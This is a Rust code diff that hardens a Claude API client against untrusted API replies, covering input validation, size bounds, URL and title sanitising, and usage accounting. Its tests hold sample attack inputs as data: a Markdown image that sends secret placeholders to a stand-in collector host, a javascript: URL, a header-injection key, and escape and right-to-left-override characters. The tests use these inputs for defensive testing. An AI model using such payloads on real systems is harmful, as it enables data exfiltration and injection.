@@ -144,7 +144,21 @@ fn body(model: &str, research: bool, own_chain: bool, system: &str, messages: &V
     body
 }
 
-fn request(http: &reqwest::Client, base: &str, key: &str, body: &Value) -> reqwest::RequestBuilder {
+fn validate_api_key(key: &str) -> Result<()> {
+    let trimmed = key.trim();
+    if trimmed.is_empty() || key.len() > 512 || key.chars().any(char::is_control) {
+        bail!("the configured Claude API key is empty or contains control characters");
+    }
+    Ok(())
+}
+
+fn request(
+    http: &reqwest::Client,
+    base: &str,
+    key: &str,
+    body: &Value,
+) -> Result<reqwest::RequestBuilder> {
+    validate_api_key(key)?;
     let mut request = http
         .post(format!("{}/messages", base.trim_end_matches('/')))
         .header("x-api-key", key)
@@ -153,14 +167,14 @@ fn request(http: &reqwest::Client, base: &str, key: &str, body: &Value) -> reqwe
     if body.get("fallbacks").is_some() {
         request = request.header("anthropic-beta", FALLBACK_BETA);
     }
-    request
+    Ok(request)
 }
 
 /// Sends the request and turns anything but a success into a message a
 /// person can act on.
 async fn send(request: reqwest::RequestBuilder, base: &str) -> Result<reqwest::Response> {
     crate::ai::validate_cloud_url(base)?;
-    let response = match request.send().await {
+    let mut response = match request.send().await {
         Ok(response) => response,
         Err(error) if error.is_connect() => bail!("cannot connect to the Claude API at {base}"),
         Err(error) if error.is_timeout() => bail!("the Claude API did not answer in time"),
@@ -170,7 +184,7 @@ async fn send(request: reqwest::RequestBuilder, base: &str) -> Result<reqwest::R
     if status.is_success() {
         return Ok(response);
     }
-    let detail = response.text().await.unwrap_or_default();
+    let detail = crate::ai::read_error(&mut response).await;
     let error = serde_json::from_str::<Value>(&detail).unwrap_or_default();
     let kind = error.pointer("/error/type").and_then(Value::as_str);
     let message = error
@@ -216,7 +230,6 @@ fn refusal(asked: &[&str], category: Option<&str>) -> anyhow::Error {
 /// What one model made of the question.
 struct Attempt {
     text: String,
-    counts: Counts,
     /// `Some` when a safety classifier declined; inside, its category.
     declined: Option<Option<String>>,
 }
@@ -225,7 +238,8 @@ fn category(details: Option<&Value>) -> Option<String> {
     details
         .and_then(|d| d.get("category"))
         .and_then(Value::as_str)
-        .map(str::to_owned)
+        .map(|c| sanitize(c, 80))
+        .filter(|c| !c.is_empty())
 }
 
 /// Token counts as the API reports them, kept up to date over a stream.
@@ -240,14 +254,21 @@ struct Counts {
 }
 
 impl Counts {
+    fn set_model(&mut self, value: Option<&str>) {
+        if let Some(clean) = value.map(|m| sanitize(m, 120)).filter(|m| !m.is_empty()) {
+            self.model = Some(clean);
+        }
+    }
+
     fn read(&mut self, usage: &Value) {
         let number = |key: &str| usage.get(key).and_then(Value::as_u64);
         // Cached input is input all the same; meow does not cache prompts,
         // so pricing it in full never understates the cost.
-        let cached = number("cache_creation_input_tokens").unwrap_or(0)
-            + number("cache_read_input_tokens").unwrap_or(0);
+        let cached = number("cache_creation_input_tokens")
+            .unwrap_or(0)
+            .saturating_add(number("cache_read_input_tokens").unwrap_or(0));
         if let Some(input) = number("input_tokens") {
-            self.input = self.input.max(input + cached);
+            self.input = self.input.max(input.saturating_add(cached));
         }
         if let Some(output) = number("output_tokens") {
             self.output = self.output.max(output);
@@ -256,7 +277,8 @@ impl Counts {
             .pointer("/server_tool_use/web_search_requests")
             .and_then(Value::as_u64);
         if let Some(searches) = searches {
-            self.searches = self.searches.max(searches as u32);
+            let capped = searches.min(u64::from(u32::MAX)) as u32;
+            self.searches = self.searches.max(capped);
         }
     }
 
@@ -277,6 +299,48 @@ impl Counts {
     }
 }
 
+fn append_bounded_utf8<'a>(target: &mut String, piece: &'a str, max: usize) -> &'a str {
+    let remaining = max.saturating_sub(target.len());
+    if remaining == 0 {
+        return "";
+    }
+    if piece.len() <= remaining {
+        target.push_str(piece);
+        return piece;
+    }
+    let mut end = remaining;
+    while !piece.is_char_boundary(end) {
+        end -= 1;
+    }
+    let prefix = &piece[..end];
+    target.push_str(prefix);
+    prefix
+}
+
+fn sanitize_source_url(raw: &str) -> Option<String> {
+    let trimmed = raw.trim();
+    if trimmed.is_empty()
+        || trimmed.len() > 500
+        || trimmed.chars().any(|c| {
+            c.is_control()
+                || c.is_whitespace()
+                || crate::evidence::is_hidden(c)
+                || matches!(c, '<' | '>' | '`')
+        })
+    {
+        return None;
+    }
+    let parsed = url::Url::parse(trimmed).ok()?;
+    if !matches!(parsed.scheme(), "http" | "https")
+        || parsed.host_str().is_none()
+        || !parsed.username().is_empty()
+        || parsed.password().is_some()
+    {
+        return None;
+    }
+    Some(trimmed.to_owned())
+}
+
 /// `[C]`: one streamed reply. `on_text` receives each piece as it arrives.
 #[allow(clippy::too_many_arguments)]
 async fn triage(
@@ -288,22 +352,29 @@ async fn triage(
     system: &str,
     user: &str,
     on_text: &mut (dyn FnMut(&str) + Send),
+    counts: &mut Counts,
 ) -> Result<Attempt> {
     let messages = json!([{ "role": "user", "content": user }]);
     let body = body(model, false, own_chain, system, &messages);
-    let mut response = send(request(http, base, key, &body), base).await?;
+    let mut response = send(request(http, base, key, &body)?, base).await?;
+    if let Some(len) = response.content_length() {
+        if len > crate::ai::MAX_ANSWER_BYTES as u64 {
+            bail!(
+                "the reply is larger than the {} MB meow reads",
+                crate::ai::MAX_ANSWER_BYTES / (1024 * 1024)
+            );
+        }
+    }
 
     let mut text = String::new();
-    let mut counts = Counts::default();
+    let mut truncated = false;
     let mut stop = String::new();
     let mut stop_details = None;
-    let mut buffer: Vec<u8> = Vec::new();
+    let mut lines = crate::ai::StreamLines::default();
     while let Some(chunk) = response.chunk().await.context("the reply was cut off")? {
-        buffer.extend_from_slice(&chunk);
-        while let Some(end) = buffer.iter().position(|b| *b == b'\n') {
-            let line: Vec<u8> = buffer.drain(..=end).collect();
-            let line = String::from_utf8_lossy(&line);
-            let Some(data) = line.trim().strip_prefix("data:") else {
+        lines.push(&chunk)?;
+        while let Some(line) = lines.next_line()? {
+            let Some(data) = line.strip_prefix("data:") else {
                 continue; // `event:` lines and keep-alives
             };
             let Ok(event) = serde_json::from_str::<Value>(data.trim()) else {
@@ -316,10 +387,7 @@ async fn triage(
             {
                 "message_start" => {
                     if let Some(message) = event.get("message") {
-                        counts.model = message
-                            .get("model")
-                            .and_then(Value::as_str)
-                            .map(str::to_owned);
+                        counts.set_model(message.get("model").and_then(Value::as_str));
                         counts.read(message.get("usage").unwrap_or(&Value::Null));
                     }
                 }
@@ -330,9 +398,14 @@ async fn triage(
                         .and_then(Value::as_str)
                         .filter(|_| event.pointer("/delta/type") == Some(&json!("text_delta")));
                     if let Some(piece) = piece {
-                        if text.len() + piece.len() <= MAX_REPLY {
-                            text.push_str(piece);
-                            on_text(piece);
+                        if !truncated {
+                            let added = append_bounded_utf8(&mut text, piece, MAX_REPLY);
+                            if !added.is_empty() {
+                                on_text(added);
+                            }
+                            if added.len() < piece.len() {
+                                truncated = true;
+                            }
                         }
                     }
                 }
@@ -362,18 +435,19 @@ async fn triage(
         }
     }
     let declined = (stop == "refusal").then(|| category(stop_details.as_ref()));
-    if stop == "max_tokens" {
-        on_text("\n\n[The reply was cut off at the length limit.]");
+    if stop == "max_tokens" && !truncated {
+        let note = "\n\n[The reply was cut off at the length limit.]";
+        let added = append_bounded_utf8(&mut text, note, MAX_REPLY);
+        if !added.is_empty() {
+            on_text(added);
+        }
     }
-    Ok(Attempt {
-        text,
-        counts,
-        declined,
-    })
+    Ok(Attempt { text, declined })
 }
 
 /// `[R]`: one researched reply, with Claude searching the web on
 /// Anthropic's side. Not streamed: a paused turn has to be sent back whole.
+#[allow(clippy::too_many_arguments)]
 async fn research(
     http: &reqwest::Client,
     base: &str,
@@ -382,29 +456,28 @@ async fn research(
     own_chain: bool,
     system: &str,
     user: &str,
+    counts: &mut Counts,
 ) -> Result<Attempt> {
+    const MAX_RESUME_MESSAGES_BYTES: usize = 2 * 1024 * 1024;
+    const MAX_SOURCES: usize = 12;
     let mut messages = vec![json!({ "role": "user", "content": user })];
     let mut text = String::new();
+    let mut truncated = false;
     let mut sources: Vec<String> = Vec::new();
-    let mut counts = Counts::default();
     for _ in 0..=MAX_RESUMES {
         let body = body(model, true, own_chain, system, &json!(messages));
-        let request = request(http, base, key, &body).timeout(RESEARCH_TIMEOUT);
-        let reply: Value = send(request, base)
-            .await?
-            .json()
-            .await
-            .context("the Claude API sent invalid JSON")?;
-        counts.model = reply
-            .get("model")
-            .and_then(Value::as_str)
-            .map(str::to_owned);
+        let request = request(http, base, key, &body)?.timeout(RESEARCH_TIMEOUT);
+        let mut response = send(request, base).await?;
+        let body = crate::ai::read_bounded(&mut response, crate::ai::MAX_ANSWER_BYTES).await?;
+        let reply: Value =
+            serde_json::from_slice(&body).context("the Claude API sent invalid JSON")?;
+        counts.set_model(reply.get("model").and_then(Value::as_str));
         // Usage is per request; a resumed turn adds to what came before.
         let mut this = Counts::default();
         this.read(reply.get("usage").unwrap_or(&Value::Null));
-        counts.input += this.input;
-        counts.output += this.output;
-        counts.searches += this.searches;
+        counts.input = counts.input.saturating_add(this.input);
+        counts.output = counts.output.saturating_add(this.output);
+        counts.searches = counts.searches.saturating_add(this.searches);
 
         let stop = reply
             .get("stop_reason")
@@ -413,7 +486,6 @@ async fn research(
         if stop == "refusal" {
             return Ok(Attempt {
                 text: String::new(),
-                counts,
                 declined: Some(category(reply.get("stop_details"))),
             });
         }
@@ -425,17 +497,25 @@ async fn research(
         for block in &blocks {
             match block.get("type").and_then(Value::as_str) {
                 Some("text") => {
-                    text.push_str(block.get("text").and_then(Value::as_str).unwrap_or(""));
+                    if !truncated {
+                        let piece = block.get("text").and_then(Value::as_str).unwrap_or("");
+                        let added = append_bounded_utf8(&mut text, piece, MAX_REPLY);
+                        if added.len() < piece.len() {
+                            truncated = true;
+                        }
+                    }
                 }
                 // A list is results; an object there is an error, which the
                 // model has already been told about.
                 Some("web_search_tool_result") => {
                     let results = block.get("content").and_then(Value::as_array);
                     for result in results.into_iter().flatten() {
+                        if sources.len() >= MAX_SOURCES {
+                            break;
+                        }
                         let url = result.get("url").and_then(Value::as_str);
                         let title = result.get("title").and_then(Value::as_str);
-                        if let Some(url) = url {
-                            let line = format!("- {}: {url}", title.unwrap_or("source"));
+                        if let Some(line) = source_line(title, url) {
                             if !sources.contains(&line) {
                                 sources.push(line);
                             }
@@ -446,25 +526,63 @@ async fn research(
             }
         }
         if stop != "pause_turn" {
-            if stop == "max_tokens" {
-                text.push_str("\n\n[The reply was cut off at the length limit.]");
+            if stop == "max_tokens" && !truncated {
+                let note = "\n\n[The reply was cut off at the length limit.]";
+                let _ = append_bounded_utf8(&mut text, note, MAX_REPLY);
             }
+            break;
+        }
+        if truncated {
             break;
         }
         // The server stopped mid-turn: send its own blocks back unchanged
         // and it carries on from there. No extra "continue" message.
         messages.push(json!({ "role": "assistant", "content": blocks }));
+        if serde_json::to_vec(&messages).is_ok_and(|raw| raw.len() > MAX_RESUME_MESSAGES_BYTES) {
+            break;
+        }
     }
     if !sources.is_empty() {
-        text.push_str("\n\nSources consulted:\n");
-        text.push_str(&sources[..sources.len().min(12)].join("\n"));
+        let footer = format!(
+            "\n\nSources consulted:\n{}",
+            sources[..sources.len().min(MAX_SOURCES)].join("\n")
+        );
+        if footer.len() < MAX_REPLY {
+            crate::ai::cut(&mut text, MAX_REPLY - footer.len());
+            text.push_str(&footer);
+        }
     }
-    text.truncate(MAX_REPLY);
+    crate::ai::cut(&mut text, MAX_REPLY);
     Ok(Attempt {
         text,
-        counts,
         declined: None,
     })
+}
+
+/// One line of the list of pages a search read. The title is whatever the
+/// page calls itself, the address whatever the search returned: neither may
+/// bring Markdown, a placeholder or anything but a web address into the
+/// reply, which meow then unmasks and saves.
+fn source_line(title: Option<&str>, url: Option<&str>) -> Option<String> {
+    let plain = |text: &str, max: usize| -> String {
+        crate::evidence::sanitize(text, max)
+            .chars()
+            .filter(|c| {
+                !matches!(
+                    c,
+                    '<' | '>' | '[' | ']' | '(' | ')' | '!' | '`' | '|' | '\\'
+                )
+            })
+            .collect::<String>()
+            .trim()
+            .to_owned()
+    };
+    let url = sanitize_source_url(url?)?;
+    let title = title.map(|t| plain(t, 200)).filter(|t| !t.is_empty());
+    Some(format!(
+        "- {}: `{url}`",
+        title.as_deref().unwrap_or("source")
+    ))
 }
 
 /// What came back from the Claude API for one question.
@@ -491,6 +609,38 @@ pub async fn ask(
     user: &str,
     on_text: &mut (dyn FnMut(&str) + Send),
 ) -> Result<Answer> {
+    let mut spent = Usage::default();
+    ask_with_spend(
+        http,
+        base,
+        key,
+        model,
+        fallbacks,
+        research_tier,
+        system,
+        user,
+        on_text,
+        &mut spent,
+    )
+    .await
+}
+
+/// Like [`ask`], but writes accumulated `Usage` into `spent` after each
+/// attempt (including partial multi-turn or mid-stream failures) so billed
+/// tokens and web searches are never lost when an attempt declines or errors.
+#[allow(clippy::too_many_arguments)]
+pub async fn ask_with_spend(
+    http: &reqwest::Client,
+    base: &str,
+    key: &str,
+    model: &str,
+    fallbacks: &[String],
+    research_tier: bool,
+    system: &str,
+    user: &str,
+    on_text: &mut (dyn FnMut(&str) + Send),
+    spent: &mut Usage,
+) -> Result<Answer> {
     let mut chain: Vec<&str> = vec![model];
     for next in fallbacks {
         if !chain.contains(&next.as_str()) && !next.trim().is_empty() {
@@ -498,27 +648,53 @@ pub async fn ask(
         }
     }
     let own_chain = chain.len() > 1;
-    let mut spent = Usage::default();
     let mut last_category = None;
     for (index, current) in chain.iter().enumerate() {
-        let attempt = if research_tier {
-            research(http, base, key, current, own_chain, system, user).await?
+        let mut counts = Counts::default();
+        let result = if research_tier {
+            research(
+                http,
+                base,
+                key,
+                current,
+                own_chain,
+                system,
+                user,
+                &mut counts,
+            )
+            .await
         } else {
-            triage(http, base, key, current, own_chain, system, user, on_text).await?
+            triage(
+                http,
+                base,
+                key,
+                current,
+                own_chain,
+                system,
+                user,
+                on_text,
+                &mut counts,
+            )
+            .await
         };
-        let usage = attempt.counts.usage(current);
+        let usage = counts.usage(current);
         spent.cost_usd += usage.cost_usd;
-        spent.web_search_requests += usage.web_search_requests;
-        spent.prompt_tokens += usage.prompt_tokens;
-        spent.completion_tokens += usage.completion_tokens;
+        spent.web_search_requests = spent
+            .web_search_requests
+            .saturating_add(usage.web_search_requests);
+        spent.prompt_tokens = spent.prompt_tokens.saturating_add(usage.prompt_tokens);
+        spent.completion_tokens = spent
+            .completion_tokens
+            .saturating_add(usage.completion_tokens);
+        let attempt = result?;
         let Some(category) = attempt.declined else {
             if research_tier {
                 on_text(&attempt.text);
             }
             return Ok(Answer {
                 text: attempt.text,
-                usage: spent,
-                model: attempt.counts.answered_by(current),
+                usage: *spent,
+                model: counts.answered_by(current),
             });
         };
         last_category = category;
@@ -534,29 +710,45 @@ pub async fn ask(
     Err(refusal(&chain, last_category.as_deref()))
 }
 
+fn validate_model_id(model: &str) -> Result<()> {
+    if model.is_empty()
+        || model.len() > 128
+        || matches!(model, "." | "..")
+        || !model
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | ':'))
+    {
+        bail!("refusing invalid model id '{model}'");
+    }
+    Ok(())
+}
+
 /// The models this key may use (`GET /v1/models`); also the way to find out
 /// whether the API accepts the key at all.
 pub async fn list_models(http: &reqwest::Client, base: &str, key: &str) -> Result<Vec<String>> {
+    validate_api_key(key)?;
     let request = http
         .get(format!("{}/models", base.trim_end_matches('/')))
         .header("x-api-key", key)
         .header("anthropic-version", API_VERSION);
-    let reply: Value = send(request, base)
-        .await?
-        .json()
-        .await
-        .context("the Claude API sent invalid JSON")?;
+    let mut response = send(request, base).await?;
+    let body = crate::ai::read_bounded(&mut response, crate::ai::MAX_ANSWER_BYTES).await?;
+    let reply: Value = serde_json::from_slice(&body).context("the Claude API sent invalid JSON")?;
     let models = reply.get("data").and_then(Value::as_array);
     Ok(models
         .into_iter()
         .flatten()
         .filter_map(|model| model.get("id").and_then(Value::as_str))
-        .map(str::to_owned)
+        .map(|id| sanitize(id, 120))
+        .filter(|id| !id.is_empty())
+        .take(500)
         .collect())
 }
 
 /// Whether this key is offered `model` (`GET /v1/models/{id}`).
 pub async fn has_model(http: &reqwest::Client, base: &str, key: &str, model: &str) -> Result<()> {
+    validate_api_key(key)?;
+    validate_model_id(model)?;
     let request = http
         .get(format!("{}/models/{model}", base.trim_end_matches('/')))
         .header("x-api-key", key)
@@ -908,6 +1100,34 @@ mod tests {
         assert_eq!(mock.requests.lock().unwrap().len(), 1);
     }
 
+    #[test]
+    fn a_search_result_brings_no_markdown_placeholder_or_odd_address_into_the_reply() {
+        let line = source_line(
+            Some("![s](https://collector.example/p.png?a=<<SEC_01>>&h=<<HOST_01>>) `x` | y"),
+            Some("https://example.org/advisory"),
+        )
+        .unwrap();
+        assert!(line.ends_with(": `https://example.org/advisory`"), "{line}");
+        for mark in ["![", "](", "<<", ">>", "|"] {
+            assert!(!line.contains(mark), "{mark} in {line}");
+        }
+        assert_eq!(line.matches('`').count(), 2, "{line}");
+        assert_eq!(
+            source_line(None, Some("https://example.org/a")).unwrap(),
+            "- source: `https://example.org/a`"
+        );
+        for bad in [
+            "javascript:alert(1)",
+            "data:text/html,x",
+            "https://collector.example/?a=<<SEC_01>>",
+            "https://collector.example/a`b",
+            "not a url",
+        ] {
+            assert_eq!(source_line(Some("t"), Some(bad)), None, "{bad}");
+        }
+        assert_eq!(source_line(Some("t"), None), None);
+    }
+
     #[tokio::test]
     async fn research_searches_on_claudes_side_and_resumes_a_paused_turn() {
         let (base, mock) = claude_api().await;
@@ -916,8 +1136,8 @@ mod tests {
         assert_eq!(
             answer.text,
             "Looking it up. Fixed in 1.20.1.\n\nSources consulted:\n\
-             - nginx security advisories: https://nginx.org/en/security_advisories.html\n\
-             - NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-23017"
+             - nginx security advisories: `https://nginx.org/en/security_advisories.html`\n\
+             - NVD: `https://nvd.nist.gov/vuln/detail/CVE-2021-23017`"
         );
         assert_eq!(shown, answer.text, "shown once, complete");
         assert_eq!(answer.usage.web_search_requests, 2);
@@ -1032,5 +1252,152 @@ mod tests {
         assert!(!is_claude_api("https://openrouter.ai/api/v1"));
         assert!(!is_claude_api("https://api.anthropic.com.evil.example/v1"));
         assert!(!is_claude_api("not a url"));
+    }
+
+    #[test]
+    fn source_urls_truncation_and_token_counts_are_hardened() {
+        assert_eq!(
+            sanitize_source_url("https://nginx.org/en/security_advisories.html"),
+            Some("https://nginx.org/en/security_advisories.html".into())
+        );
+        assert_eq!(sanitize_source_url("javascript:alert(1)"), None);
+        assert_eq!(sanitize_source_url("https://user:pass@example.com/a"), None);
+        assert_eq!(
+            sanitize_source_url("https://example.com/path\n## Injected"),
+            None
+        );
+        assert_eq!(
+            sanitize_source_url("https://example.com/\u{202e}gnp.exe"),
+            None
+        );
+        assert_eq!(sanitize_source_url("https://example.com/<script>"), None);
+        assert_eq!(sanitize_source_url("https://example.com/a`b"), None);
+
+        let mut buf = String::new();
+        assert_eq!(append_bounded_utf8(&mut buf, "hello ", 9), "hello ");
+        assert_eq!(append_bounded_utf8(&mut buf, "ééé", 9), "é");
+        assert_eq!(buf, "hello é");
+
+        let mut counts = Counts::default();
+        counts.read(&json!({
+            "input_tokens": u64::MAX - 2,
+            "cache_creation_input_tokens": 100,
+            "cache_read_input_tokens": 100,
+            "output_tokens": 50,
+            "server_tool_use": { "web_search_requests": u64::from(u32::MAX) + 50 }
+        }));
+        assert_eq!(counts.input, u64::MAX);
+        assert_eq!(counts.searches, u32::MAX);
+    }
+
+    #[tokio::test]
+    async fn mid_turn_failure_still_charges_spent_and_max_tokens_cutoff_is_cached() {
+        let step = Arc::new(Mutex::new(0usize));
+        let state = Arc::clone(&step);
+        let app = Router::new().route(
+            "/v1/messages",
+            post(move |Json(body): Json<Value>| {
+                let state = Arc::clone(&state);
+                async move {
+                    if body["stream"] == true {
+                        return sse(&[
+                            json!({ "type": "message_start", "message": {
+                                "model": "claude-opus-5-5\u{1b}[31m",
+                                "usage": { "input_tokens": 500, "output_tokens": 1 } } }),
+                            json!({ "type": "content_block_delta", "index": 0,
+                                "delta": { "type": "text_delta", "text": "Partial answer" } }),
+                            json!({ "type": "message_delta",
+                                "delta": { "stop_reason": "max_tokens" },
+                                "usage": { "output_tokens": 250 } }),
+                            json!({ "type": "message_stop" }),
+                        ]);
+                    }
+                    let mut turn = state.lock().unwrap();
+                    *turn += 1;
+                    if *turn == 1 {
+                        Json(json!({
+                            "model": "claude-opus-5-5",
+                            "stop_reason": "pause_turn",
+                            "content": [{ "type": "text", "text": "Searching... " }],
+                            "usage": {
+                                "input_tokens": 3000,
+                                "output_tokens": 500,
+                                "server_tool_use": { "web_search_requests": 1 }
+                            }
+                        }))
+                        .into_response()
+                    } else {
+                        (
+                            StatusCode::INTERNAL_SERVER_ERROR,
+                            Json(json!({ "type": "error", "error": {
+                                "type": "api_error", "message": "upstream broke" } })),
+                        )
+                            .into_response()
+                    }
+                }
+            }),
+        );
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let base = format!("http://{}/v1", listener.local_addr().unwrap());
+        tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
+
+        let http = reqwest::Client::new();
+        // Control characters in API key are rejected before network I/O.
+        let bad_key = ask(
+            &http,
+            &base,
+            "sk-ant-bad\r\nx-injected: 1",
+            DEFAULT_MODEL,
+            &[],
+            false,
+            "s",
+            "u",
+            &mut |_| {},
+        )
+        .await;
+        assert!(bad_key.is_err());
+
+        // Triage max_tokens cutoff notice is present in both streamed output and Answer.text,
+        // and untrusted model identifiers are stripped of terminal escape sequences.
+        let mut shown = String::new();
+        let cutoff = ask(
+            &http,
+            &base,
+            KEY,
+            DEFAULT_MODEL,
+            &[],
+            false,
+            "s",
+            "u",
+            &mut |p| shown.push_str(p),
+        )
+        .await
+        .unwrap();
+        assert!(cutoff
+            .text
+            .ends_with("[The reply was cut off at the length limit.]"));
+        assert_eq!(cutoff.text, shown);
+        assert!(!cutoff.model.contains('\u{1b}'));
+
+        // Research failure on turn 2 still records turn 1's tokens and search in `spent`.
+        let mut spent = Usage::default();
+        let err = ask_with_spend(
+            &http,
+            &base,
+            KEY,
+            DEFAULT_MODEL,
+            &[],
+            true,
+            "s",
+            "u",
+            &mut |_| {},
+            &mut spent,
+        )
+        .await;
+        assert!(err.is_err());
+        assert_eq!(spent.prompt_tokens, 3000);
+        assert_eq!(spent.completion_tokens, 500);
+        assert_eq!(spent.web_search_requests, 1);
+        assert!(spent.cost_usd > 0.0);
     }
 }
